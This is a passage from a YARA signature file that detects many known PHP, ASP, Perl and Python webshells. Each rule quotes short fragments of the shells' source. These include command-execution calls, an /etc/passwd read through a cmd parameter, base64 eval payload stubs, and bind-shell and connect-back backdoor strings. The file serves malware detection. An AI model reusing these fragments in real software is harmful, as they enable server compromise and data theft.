      minimum_yara = "1.7"
      
   strings:
      $s0 = "If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))" 
      $s1 = "password" 
      $s2 = "session(\"shagman\")=" 
   condition: 
      2 of them
}

rule Webshell_h4ntu_shell__powered_by_tsoi__RID367B : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file h4ntu shell [powered by tsoi].txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 16:57:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "h4ntu shell" 
      $s1 = "system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");" 
   condition: 
      1 of them
}

rule Webshell_Ajan_asp_RID2DC3 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Ajan.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 10:45:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "c:\\downloaded.zip" 
      $s2 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword
      $s3 = "http://www35.websamba.com/cybervurgun/" 
   condition: 
      1 of them
}

rule Webshell_PHANTASMA_php_RID2EEA : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file PHANTASMA.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:34:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = ">[*] Safemode Mode Run</DIV>" 
      $s1 = "$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>" 
      $s2 = "[*] Spawning Shell" 
      $s3 = "Cha0s" 
   condition: 
      2 of them
}

rule Webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_php_RID4390 : DEMO EXPLOIT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 02:15:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXPLOIT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<option value=\"cat /var/cpanel/accounting.log\">/var/cpanel/accounting.log</opt" 
      $s1 = "Liz0ziM Private Safe Mode Command Execuriton Bypass" 
      $s2 = "echo \"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\";" fullword
   condition: 
      1 of them
}

rule Webshell_Nshell__1__php_php_RID31A8 : DEMO T1033 T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Nshell (1).php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:31:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1033, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo \"Command : <INPUT TYPE=text NAME=cmd value=\".@stripslashes(htmlentities($" 
      $s1 = "if(!$whoami)$whoami=exec(\"whoami\"); echo \"whoami :\".$whoami.\"<br>\";" fullword
   condition: 
      1 of them
}

rule Webshell_shankar_php_php_RID30DC : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file shankar.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:57:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2022-02-17"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $Author = "ShAnKaR" 
      $s0 = "<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input" 
      $s3 = "Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b" 
   condition: 
      1 of ( $s* ) and $Author
}

rule Webshell_Casus15_php_php_RID3059 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Casus15.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:36:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na" 
      $s2 = "echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'" 
      $s3 = "value='Calistirmak istediginiz " 
   condition: 
      1 of them
}

rule Webshell_small_php_php_RID300D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file small.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:23:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$pass='abcdef1234567890abcdef1234567890';" fullword
      $s2 = "eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1" 
      $s4 = "@ini_set('error_log',NULL);" fullword
   condition: 
      2 of them
}

rule Webshell_fuckphpshell_php_RID3156 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file fuckphpshell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:18:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$succ = \"Warning! " 
      $s1 = "Don`t be stupid .. this is a priv3 server, so take extra care!" 
      $s2 = "\\*=-- MEMBERS AREA --=*/" 
      $s3 = "preg_match('/(\\n[^\\n]*){' . $cache_lines . '}$/', $_SESSION['o" 
   condition: 
      2 of them
}

rule Webshell_ngh_php_php_RID2F31 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file ngh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Cr4sh_aka_RKL" 
      $s1 = "NGH edition" 
      $s2 = "/* connectback-backdoor on perl" 
      $s3 = "<form action=<?=$script?>?act=bindshell method=POST>" 
      $s4 = "$logo = \"R0lGODlhMAAwAOYAAAAAAP////r" 
   condition: 
      1 of them
}

rule Webshell_SimAttacker___Vrsion_1_0_0___priv8_4_My_friend_php_RID3D96 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 22:00:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend" 
      $s3 = " fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim" 
      $s4 = "echo \"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora" 
   condition: 
      1 of them
}

rule Webshell_RemExp_asp_RID2E9A : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file RemExp.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:21:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<title>Remote Explorer</title>" 
      $s3 = " FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFi" 
      $s4 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f" 
   condition: 
      2 of them
}

rule Webshell_klasvayv_asp_RID2FBA : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file klasvayv.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:09:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "set aktifklas=request.querystring(\"aktifklas\")" 
      $s2 = "action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>" 
      $s3 = "<font color=\"#858585\">www.aventgrup.net" 
      $s4 = "style=\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT" 
   condition: 
      1 of them
}

rule Webshell_wh_bindshell_py_RID30E1 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file wh_bindshell.py.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:58:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "#Use: python wh_bindshell.py [port] [password]" 
      $s2 = "python -c\"import md5;x=md5.new('you_password');print x.hexdigest()\"" fullword
      $s3 = "#bugz: ctrl+c etc =script stoped=" fullword
   condition: 
      1 of them
}

rule Webshell_lurm_safemod_on_cgi_RID3272 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file lurm_safemod_on.cgi.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:05:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Network security team :: CGI Shell" fullword
      $s1 = "#########################<<KONEC>>#####################################" fullword
      $s2 = "##if (!defined$param{pwd}){$param{pwd}='Enter_Password'};##" fullword
   condition: 
      1 of them
}

rule Webshell_backupsql_php_often_with_c99shell_RID37F5 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file backupsql.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 18:00:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "//$message.= \"--{$mime_boundary}\\n\" .\"Content-Type: {$fileatt_type};\\n\" ." 
      $s4 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog" 
   condition: 
      all of them
}

rule Webshell_uploader_php_php_RID3150 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file uploader.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:17:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
      $s3 = "Send this file: <INPUT NAME=\"userfile\" TYPE=\"file\">" fullword
      $s4 = "<INPUT TYPE=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">" fullword
   condition: 
      2 of them
}

rule Webshell_Dx_php_php_RID2EB0 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Dx.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:25:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx" 
      $s2 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util" 
      $s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP" 
   condition: 
      1 of them
}

rule Webshell_Rem_View_php_php_RID3112 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Rem View.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:06:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$php=\"/* line 1 */\\n\\n// \".mm(\"for example, uncomment next line\").\"" 
      $s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'" 
      $s4 = "Welcome to phpRemoteView (RemView)" 
   condition: 
      1 of them
}

rule Webshell_Java_Shell_js_RID2FBB : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Java Shell.js.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:09:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "PySystemState.initialize(System.getProperties(), null, argv);" fullword
      $s3 = "public class JythonShell extends JPanel implements Runnable {" fullword
      $s4 = "public static int DEFAULT_SCROLLBACK = 100" 
   condition: 
      2 of them
}

rule Webshell_STNC_php_php_RID2F2C : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file STNC.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:45:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "drmist.ru" fullword
      $s1 = "hidden(\"action\",\"download\").hidden_pwd().\"<center><table><tr><td width=80" 
      $s2 = "STNC WebShell" 
      $s3 = "http://www.security-teams.net/index.php?showtopic=" 
   condition: 
      1 of them
}

rule Webshell_aZRaiLPhp_v1_0_php_RID312D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file aZRaiLPhp v1.0.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:11:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "azrailphp" 
      $s1 = "<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>" 
      $s3 = "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>" 
   condition: 
      2 of them
}

rule Webshell_Moroccan_Spamers_Ma_EditioN_By_GhOsT_php_RID3A0F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Moroccan Spamers Ma-EditioN By GhOsT.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 19:30:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = ";$sd98=\"john.barker446@gmail.com\"" 
      $s1 = "print \"Sending mail to $to....... \";" 
      $s2 = "<td colspan=\"2\" width=\"715\" background=\"/simparts/images/cellpic1.gif\" hei" 
   condition: 
      1 of them
}

rule Webshell_simple_backdoor_php_RID327B : DEMO T1087_001 T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file simple-backdoor.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:07:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1087_001, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$cmd = ($_REQUEST['cmd']);" fullword
      $s1 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" 
      $s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
   condition: 
      2 of them
}

rule Webshell_Dive_Shell_1_0___Emperor_Hacking_Team_php_RID3A3C : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Dive Shell 1.0 - Emperor Hacking Team.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 19:37:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Emperor Hacking TEAM" 
      $s1 = "Simshell" fullword
      $s2 = "ereg('^[[:blank:]]*cd[[:blank:]]" 
      $s3 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST" 
   condition: 
      2 of them
}

rule Webshell_Asmodeus_v0_1_pl_RID30B7 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Asmodeus v0.1.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "[url=http://www.governmentsecurity.org" 
      $s1 = "perl asmodeus.pl client 6666 127.0.0.1" 
      $s2 = "print \"Asmodeus Perl Remote Shell" 
      $s4 = "$internet_addr = inet_aton(\"$host\") or die \"ALOA:$!\\n\";" fullword
   condition: 
      2 of them
}

rule Webshell_backup_php_often_with_c99shell_RID36A5 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file backup.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 17:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "#phpMyAdmin MySQL-Dump" fullword
      $s2 = ";db_connect();header('Content-Type: application/octetstr" 
      $s4 = "$data .= \"#Database: $database" fullword
   condition: 
      all of them
}

rule Webshell_phpshell17_php_RID3015 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file phpshell17.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:24:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword
      $s1 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></" 
      $s2 = "href=\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>" fullword
   condition: 
      1 of them
}

rule Webshell_myshell_php_php_RID30F2 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file myshell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:01:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@chdir($work_dir) or ($shellOutput = \"MyShell: can't change directory." 
      $s1 = "echo \"<font color=$linkColor><b>MyShell file editor</font> File:<font color" 
      $s2 = " $fileEditInfo = \"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$" 
   condition: 
      2 of them
}

rule Webshell_SimShell_1_0___Simorgh_Security_MGZ_php_RID3987 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file SimShell 1.0 - Simorgh Security MGZ.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 19:07:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Simorgh Security Magazine " 
      $s1 = "Simshell.css" 
      $s2 = "} elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], " 
      $s3 = "www.simorgh-ev.com" 
   condition: 
      2 of them
}

rule Webshell_rootshell_php_RID3029 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file rootshell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:28:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "shells.dl.am" 
      $s1 = "This server has been infected by $owner" 
      $s2 = "<input type=\"submit\" value=\"Include!\" name=\"inc\"></p>" 
      $s4 = "Could not write to file! (Maybe you didn't enter any text?)" 
   condition: 
      2 of them
}

rule Webshell_connectback2_pl_RID308E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file connectback2.pl.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:44:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   " 
      $s1 = "echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel" 
      $s2 = "ConnectBack Backdoor" 
   condition: 
      1 of them
}

rule Webshell_DefaceKeeper_0_2_php_RID3201 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file DefaceKeeper_0.2.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>" fullword
      $s1 = "eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9" 
      $s2 = "<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center" 
   condition: 
      1 of them
}

rule Webshell_backdoor1_php_RID2FC3 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file backdoor1.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:11:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "echo \"[DIR] <A HREF=\\\"\".$_SERVER['PHP_SELF'].\"?rep=\".realpath($rep.\".." 
      $s2 = "class backdoor {" 
      $s4 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?copy=1\\\">Copier un fichier</a> <" 
   condition: 
      1 of them
}

rule Webshell_elmaliseker_asp_RID30D7 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file elmaliseker.asp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:57:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\"" 
      $s1 = "<form name=frmCMD method=post action=\"<%=gURL%>\">" 
      $s2 = "dim zombie_array,special_array" 
      $s3 = "http://vnhacker.org" 
   condition: 
      1 of them
}

rule Webshell_s72_Shell_v1_1_Coding_html_RID3436 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file s72 Shell v1.1 Coding.html.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:20:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><" 
      $s1 = "s72 Shell v1.0 Codinf by Cr@zy_King" 
      $s3 = "echo \"<p align=center>Dosya Zaten Bulunuyor</p>\"" 
   condition: 
      1 of them
}

rule Webshell_Antichat_Socks5_Server_php_php_RID368D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Antichat Socks5 Server.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 17:00:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);" fullword
      $s3 = "#   [+] Domain name address type" 
      $s4 = "www.antichat.ru" 
   condition: 
      1 of them
}

rule Webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_php_RID3A0D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 19:30:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy" 
      $s1 = "Mode Shell v1.0</font></span>" 
      $s2 = "has been already loaded. PHP Emperor <xb5@hotmail." 
   condition: 
      1 of them
}

rule Webshell_mysql_php_php_RID302A : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file mysql.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:28:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "action=mysqlread&mass=loadmass\">load all defaults" 
      $s2 = "if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru" 
      $s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = " 
   condition: 
      1 of them
}

rule Webshell_Worse_Linux_Shell_php_RID3323 : DEMO LINUX SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Worse Linux Shell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:35:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, LINUX, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "print \"<tr><td><b>Server is:</b></td><td>\".$_SERVER['SERVER_SIGNATURE'].\"</td" 
      $s2 = "print \"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\"_cmd" 
   condition: 
      1 of them
}

rule Webshell_cyberlords_sql_php_php_RID33DC : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file cyberlords_sql.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:05:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Coded by n0 [nZer0]" 
      $s1 = " www.cyberlords.net" 
